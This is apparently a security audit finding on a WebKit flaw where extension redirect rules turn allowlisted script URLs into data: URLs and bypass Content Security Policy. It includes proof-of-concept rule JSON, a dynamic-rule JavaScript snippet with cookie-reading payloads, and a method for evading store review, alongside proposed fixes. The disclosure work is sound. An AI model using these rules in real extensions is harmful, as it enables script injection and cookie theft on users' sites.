# Finding: DeclarativeNetRequest URL Transform Scheme Bypass

## Summary

Safari's WebKit Web Extension implementation of `declarativeNetRequest` `redirect` rules with `transform.scheme` fails to restrict the target scheme to safe values. While Chrome restricts `transform.scheme` to only `["http", "https", "ftp", "chrome-extension"]`, WebKit only blocks `javascript:` — allowing `data:`, `file:`, `blob:`, and arbitrary custom schemes. Combined with missing re-validation of redirected URLs against SecurityOrigin and CSP, this enables a malicious extension with only `declarativeNetRequest` permission to bypass Content Security Policy on any page.

## Severity

**High** — CSP bypass via extension with minimal permissions (no host_permissions required)

## Affected Code

### Layer 1: WebKit Extensions DNR Rule Parser (NO scheme validation)
- **File**: `UIProcess/Extensions/Cocoa/_WKWebExtensionDeclarativeNetRequestRule.mm`
- **Line 458**: `declarativeNetRequestRuleURLTransformScheme: NSString.class` — only type-checks as string
- **Line 930-957**: `ruleInWebKitFormat` passes transform dictionary to WebKit content blocker format without modification

### Layer 2: WebCore Content Extensions Parser (only blocks javascript:)
- **File**: `WebCore/contentextensions/ContentExtensionActions.cpp`
- **Line 499-505**:
```cpp
if (auto uncanonicalizedScheme = transform.getString("scheme"_s); !!uncanonicalizedScheme) {
    auto scheme = WTF::URLParser::maybeCanonicalizeScheme(uncanonicalizedScheme);
    if (!scheme)
        return makeUnexpected(ContentExtensionError::JSONRedirectURLSchemeInvalid);
    if (scheme == "javascript"_s)
        return makeUnexpected(ContentExtensionError::JSONRedirectToJavaScriptURL);
    action.scheme = WTF::move(*scheme);  // ANY other scheme passes!
}
```

### Layer 3: URL Transform Application (no validation)
- **File**: `WebCore/contentextensions/ContentExtensionActions.cpp`  
- **Line 713-739** (`URLTransformAction::applyToURL`):
```cpp
void RedirectAction::URLTransformAction::applyToURL(URL& url) const {
    // ... other transforms ...
    if (!!scheme)
        url.setProtocol(scheme);  // Sets arbitrary scheme with no validation
}
```

### Layer 4: Request Processing (no re-validation after redirect)
- **File**: `WebCore/loader/cache/CachedResourceLoader.cpp`
- **Line 1142**: `canRequest()` validates original URL (passes — it's HTTP)
- **Line 1179**: `request.applyResults()` changes URL scheme (e.g., to `data:`)
- **Line 1214**: `url = request.resourceRequest().url()` — local var updated
- **NO second `canRequest()` or CSP check on the modified URL**

### Layer 5: SubresourceLoader (only blocks data: in server redirects)
- **File**: `WebCore/loader/SubresourceLoader.cpp`
- **Line 287**: `if (newRequest.url().protocolIsData()...)` — only for server redirects (HTTP 3xx), NOT content extension redirects

## Root Cause

1. **Missing scheme allowlist**: WebKit doesn't restrict `transform.scheme` to safe values (unlike Chrome's `kAllowedTransformSchemes = {"http", "https", "ftp", "chrome-extension"}`)
2. **Security checks bypass**: `canRequest()` (which includes SecurityOrigin::canDisplay and CSP checks) runs BEFORE content extension rules are applied. No re-validation occurs after the URL is transformed.
3. **SubresourceLoader check inapplicable**: The `data:` URL blocking in SubresourceLoader (line 287) only applies to server-initiated HTTP redirects, not content extension redirects which modify the request URL pre-flight.

## Attack Scenario

### Scenario 1: CSP Bypass via data: scheme transform

1. **Attacker extension manifest** requires only `declarativeNetRequest` permission (no host_permissions, no scripting, no content scripts)
2. Extension rule:
```json
{
  "id": 1,
  "priority": 1,
  "action": {
    "type": "redirect",
    "redirect": {
      "transform": {
        "scheme": "data",
        "host": "",
        "path": "text/javascript;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="
      }
    }
  },
  "condition": {
    "urlFilter": "cdn.example.com/analytics.js",
    "resourceTypes": ["script"]
  }
}
```
3. Victim page `https://bank.example.com` has strict CSP: `script-src 'nonce-abc123' cdn.example.com`
4. Page loads `<script src="https://cdn.example.com/analytics.js">`
5. CSP check passes (cdn.example.com is allowlisted) at line 611
6. Content extension transforms URL to `data:text/javascript;base64,...`
7. **CSP is NOT re-checked** — the script loads with attacker-controlled content
8. Result: Arbitrary JavaScript execution on CSP-protected page

### Scenario 2: Local file access via file: scheme (sandboxed, defense-in-depth)

Same pattern but with `"scheme": "file"` — would be blocked by WebContent sandbox in practice, but represents a defense-in-depth violation since the web security model's `canDisplay()` check was already bypassed.

## Impact

- **CSP bypass on arbitrary pages**: An extension with ONLY `declarativeNetRequest` permission (granted without user prompt in Safari) can inject arbitrary scripts into any page regardless of CSP policy
- **Minimal permission footprint**: `declarativeNetRequest` is specifically designed as a "less privileged" alternative to `webRequest` — it's supposed to be safe because the extension "can't see request content." But redirect rules break this assumption.
- **No user interaction required**: Rules are applied automatically to all matching requests
- **Stealth**: No content script injection, no visible permission prompts beyond the initial extension install

## Chrome Comparison

Chrome explicitly restricts `transform.scheme` to `{"http", "https", "ftp", "chrome-extension"}` in `extensions/browser/api/declarative_net_request/constants.cc`:

```cpp
const char* const kAllowedTransformSchemes[4] = {
    url::kHttpScheme, url::kHttpsScheme, url::kFtpScheme,
    extensions::kExtensionScheme};
```

This is validated in `indexed_rule.cc:309-319` (`IsValidTransformScheme`). WebKit has no equivalent check.

## regexSubstitution Attack Vector

Additionally, `regexSubstitution` (ContentExtensionActions.cpp line 429-473) can produce arbitrary URLs including `data:` or `file:` schemes. The only validation is `URL::isValid()`:

```cpp
URL replacementURL(substitution);
if (replacementURL.isValid())
    url = WTF::move(replacementURL);  // No scheme check!
```

An extension rule like:
```json
{
  "id": 2,
  "action": {
    "type": "redirect",
    "redirect": {
      "regexSubstitution": "data:text/javascript;base64,YWxlcnQoMSk="
    }
  },
  "condition": {
    "regexFilter": ".*cdn\\.example\\.com/script\\.js.*",
    "resourceTypes": ["script"]
  }
}
```

Would redirect any matching script load to an attacker-controlled data: URL, bypassing CSP.

## Dynamic Rule Evasion

The attack can evade App Store review by:
1. Publishing extension with only `declarativeNetRequest` permission and benign static rules
2. After installation, the background service worker calls `declarativeNetRequest.updateDynamicRules()`:
```javascript
chrome.declarativeNetRequest.updateDynamicRules({
  addRules: [{
    id: 1,
    priority: 1,
    action: {
      type: "redirect",
      redirect: {
        regexSubstitution: "data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="
      }
    },
    condition: {
      regexFilter: "https://cdn\\.jsdelivr\\.net/npm/bootstrap.*\\.js",
      resourceTypes: ["script"]
    }
  }]
});
```
3. The IPC `DeclarativeNetRequestUpdateDynamicRules` requires `isDeclarativeNetRequestMessageAllowed` = `isLoadedAndPrivilegedMessage + (declarativeNetRequest OR declarativeNetRequestWithHostAccess)` — satisfied by the background page
4. No host permissions required for redirect rules
5. Redirect rules affect ALL page loads (not scoped to host permissions)

## Constraints

- Requires user to install the malicious extension (Safari Web Extension from App Store)
- Rules can be dynamically updated post-install, evading static analysis review
- The `data:` scheme transform for scripts requires the original URL to be in CSP's allowlist (otherwise CSP blocks before content extension runs)
- For `regexSubstitution`, the attacker must match an allowed script URL pattern
- Major CDN URLs (jsdelivr, cdnjs, unpkg, googleapis) are in most sites' CSP allowlists

## Recommended Fix

### Option A: Add scheme allowlist (matches Chrome)
In `_WKWebExtensionDeclarativeNetRequestRule.mm`, add validation:

```objc
NSString *scheme = objectForKey<NSString>(transformDictionary, declarativeNetRequestRuleURLTransformScheme, false);
if (scheme) {
    static NSSet *allowedSchemes = [NSSet setWithObjects:@"http", @"https", @"ftp", nil];
    if (![allowedSchemes containsObject:scheme.lowercaseString]) {
        if (outErrorString)
            *outErrorString = [NSString stringWithFormat:@"Rule with id %ld specifies an invalid transform scheme '%@'.", (long)_ruleID, scheme];
        return nil;
    }
}
```

### Option B: Add scheme check in WebCore (defense-in-depth)
In `ContentExtensionActions.cpp` `URLTransformAction::parse()`:

```cpp
if (scheme == "javascript"_s || scheme == "data"_s || scheme == "file"_s || scheme == "blob"_s)
    return makeUnexpected(ContentExtensionError::JSONRedirectToJavaScriptURL);
```

### Option C: Re-validate after content extension redirect
In `CachedResourceLoader.cpp` after line 1179:

```cpp
request.applyResults(WTF::move(results), page.ptr());
// Re-validate the modified URL
if (!canRequest(type, request.resourceRequest().url(), request.options(), forPreload, isRequestUpgradable, request.isLinkPreload())) {
    return makeUnexpected(ResourceError { ... });
}
```

All three should be applied for defense-in-depth.

## Status

**CONFIRMED via code analysis.** Needs empirical verification with Safari Technology Preview.

### Verification Plan
1. Create minimal Safari extension with only `declarativeNetRequest` permission
2. Add rule with `transform: { scheme: "data" }` targeting a known script URL
3. Load a page with strict CSP that allows the original script URL
4. Verify the `data:` URL script executes despite CSP

## Discovery Provenance: Chrome Audit → Safari Vulnerability

This finding was **directly derived** from our prior Chrome logic audit work:

### Source Materials Used

1. **`experiments/step1-chrome-logic/audit_results/finding_024_dnr_regex_scheme_bypass.md`**
   - Our Chrome audit identified the DNR regex scheme bypass *pattern* — noting that Chrome's `kAllowedTransformSchemes` allowlist is a critical security defense
   - Chrome itself is NOT vulnerable because this defense exists
   - But the finding documented: "if a browser lacks this check, DNR redirect + CSP timing = arbitrary code execution"

2. **`experiments/step1-chrome-logic/chromium-src/extensions/browser/api/declarative_net_request/constants.cc`**
   - We extracted Chrome's source code containing the `kAllowedTransformSchemes` definition
   - This became the direct comparison evidence proving WebKit's gap

3. **`experiments/step1-chrome-logic/chromium-src/extensions/browser/api/declarative_net_request/indexed_rule.cc`**
   - Chrome's `IsValidTransformScheme()` implementation at lines 309-319
   - Searched WebKit for equivalent → none found → vulnerability confirmed

### Methodology: Cross-Implementation Differential Analysis

```
Chrome audit (finding_024)
  → "kAllowedTransformSchemes is a known-needed defense"
  → Search WebKit for equivalent
  → Not found
  → Trace data flow to confirm exploitability
  → Confirmed: 5 layers of missing validation
  → PoC constructed
```

**Core insight**: One vendor's security hardening = another vendor's vulnerability signal. Chrome adding a restriction means "this is dangerous without the restriction." If WebKit doesn't have it, that's a reportable vulnerability.

This demonstrates the value of accumulating audit findings even when the target itself isn't vulnerable — the patterns discovered in one codebase become attack templates for others implementing the same specification.
